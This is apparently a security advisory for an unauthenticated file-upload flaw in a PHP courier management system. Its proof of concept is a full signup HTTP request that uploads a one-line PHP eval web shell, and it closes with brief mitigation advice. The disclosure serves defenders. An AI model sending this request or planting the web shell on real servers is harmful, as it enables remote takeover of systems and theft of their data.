# courier management system - Unrestricted File Upload to RCE (Sign Up)

### Vendor Homepage:

> [https://www.sourcecodester.com](https://www.sourcecodester.com/)

### Software Link:

> [courier management system](https://www.sourcecodester.com/php/16848/best-courier-management-system-project-php.html)

### Version:

> v 1.0

### Unauthenticated Unrestricted File Upload to RCE:

> The "Unauthenticated Unrestricted File Upload to Remote Code Execution (RCE)" vulnerability is a critical security flaw where attackers can upload malicious files to a web server without needing to authenticate. This vulnerability arises from the lack of proper restrictions on the types and contents of the files that can be uploaded. Once uploaded, these files can be executed on the server, allowing attackers to run arbitrary code and potentially gain full control over the server. This vulnerability poses a severe risk, as it can lead to system compromise, data breaches, and further network exploitation.

### Affected Components:

> admin_class.php

### Description:

> The presence of this vulnerability enables an unauthenticated attacker to upload .php files to the web server and execute code under the privileges of the user running the application.

## Proof of Concept:

### Manual Exploitation

Construct a signup request and add file content

```
POST /ajax.php?action=signup HTTP/1.1
Host: localhost
Content-Length: 711
sec-ch-ua: "Chromium";v="127", "Not)A;Brand";v="99"
Accept-Language: zh-CN
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLLUS1AtgLEv3A7En
Accept: */*
X-Requested-With: XMLHttpRequest
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/index.php?page=home
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=e88fl1m4o9qu9uf3lvbc6rmfu5
Connection: keep-alive

------WebKitFormBoundaryLLUS1AtgLEv3A7En
Content-Disposition: form-data; name="id"

8
------WebKitFormBoundaryLLUS1AtgLEv3A7En
Content-Disposition: form-data; name="firstname"

Mayuri K1
------WebKitFormBoundaryLLUS1AtgLEv3A7En
Content-Disposition: form-data; name="lastname"

K1
------WebKitFormBoundaryLLUS1AtgLEv3A7En
Content-Disposition: form-data; name="email"

mayuri.infospace1@gmail.com
------WebKitFormBoundaryLLUS1AtgLEv3A7En
Content-Disposition: form-data; name="password"

123456
------WebKitFormBoundaryLLUS1AtgLEv3A7En--
Content-Disposition:form-data;name= img; filename="1.php"
Content-Type:image/png

<?php @eval($_POST['cmd']); ?>
------WebKitFormBoundaryLLUS1AtgLEv3A7En--

```

![courier2.png](https://github.com/baineoli/CVE/blob/main/2024/images/courier2.png?raw=true)

![courier3.png](https://github.com/baineoli/CVE/blob/main/2024/images/courier3.png?raw=true)

## Recommendations

To mitigate this vulnerability, it's essential to implement strong authentication, validate and sanitize all file uploads, restrict file types, and ensure that uploaded files are not executable on the server.



快递管理系统在注册时没有对头像文件进行检查，导致存在未经身份验证无限制文件上传至 RCE的可能，建议使用时实施强身份验证，验证和清理所有文件上传，限制文件类型，并确保上传的文件不可在服务器上执行。